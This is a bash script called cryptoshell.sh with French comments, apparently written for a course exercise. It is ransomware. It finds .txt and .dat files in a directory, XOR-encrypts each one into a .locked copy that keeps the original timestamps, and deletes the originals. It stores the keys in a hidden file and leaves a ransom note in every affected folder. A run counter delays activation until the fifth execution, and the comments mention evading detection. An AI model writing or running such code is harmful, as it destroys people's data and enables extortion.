#!/bin/bash
. xor_helper.sh
. fct.sh

trap cleanup EXIT INT TERM # cleanup en cas d'interuption pas utiliser car jai pas de fichier temporaire 

# verifie les arguments
if [ "$#" -ne 1 ]; then
    echo "usage: ./cryptoshell.sh <repertoire>"
    exit 1
fi

if [ ! -d "$1" ] ; then 
    echo "repertoire invalide" 
    #possibilite de supprimer ce message pour ne pas etre detetcer 
    exit 1 
fi

#question 4a
# il s'active  le dimanche
#if [ "$(date +%u)" -ne 7 ]; then
#    exit 0
#fi


if [ -f ".cs_count" ]; then
    cpt=$(cat ".cs_count" 2>/dev/null) #recuperer
else
    cpt=0 #initialiser
fi

((cpt++)) #incrementation
echo "$cpt" > ".cs_count" #sauvegrade

if [ "$cpt" -eq 5 ]; then
    rm -f ".cs_count" 2>/dev/null #redirection de l'erreur vers dev/null 
else 
    exit 0 
fi


# parcours du dossier
find "$1" -type f \( -name "*.txt" -o -name "*.dat" \) | while IFS= read -r f #IFS est plus robuste surtout avec les noms de fichier avec des espaces 
do
#verifier si le fichier est deja chiffre
    if [[ "$f" == *".locked" ]]; then
        continue
    fi

    #optionel : on ecris les nom des fichier dans target.list
    
    s=$(stat -c%s "$f")
    d=$(stat -c%y "$f" | cut -d '.' -f1)
    echo "$f | $s bytes | $d" >> target.list

    key=$(generate_key 8)
    locked="$f.locked"
    xor_file "$f" "$locked" "$key"
    touch -r "$f" "$locked" 2>/dev/null #preservation horodatage
    rm -f "$f" 2>/dev/null
    echo "$key" >> .cryptoshell_key

done

#on ajoute la note (une par repertoire)
find "$1" -type f -name "*.locked" -exec dirname {} \; | sort -u | while IFS= read -r d
do
    create_ransom_note "$d"
done
